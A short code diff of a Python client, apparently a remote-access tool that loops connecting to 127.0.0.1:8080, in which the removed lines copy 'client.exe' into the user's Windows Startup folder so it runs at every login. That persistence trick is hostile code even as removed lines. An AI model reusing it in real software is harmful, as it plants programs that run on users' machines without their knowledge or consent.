@@ -16,14 +16,6 @@ ip = "127.0.0.1"
 port = 8080
 keepgoing = True
 
-try:
-    source = os.getcwd() + "\\client.exe"
-    username = os.getlogin()
-    destination = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\new.exe"
-    shutil.copyfile(source, destination)
-except:
-    print("nope")
-
 def main():
     while (keepgoing == True):
         try:
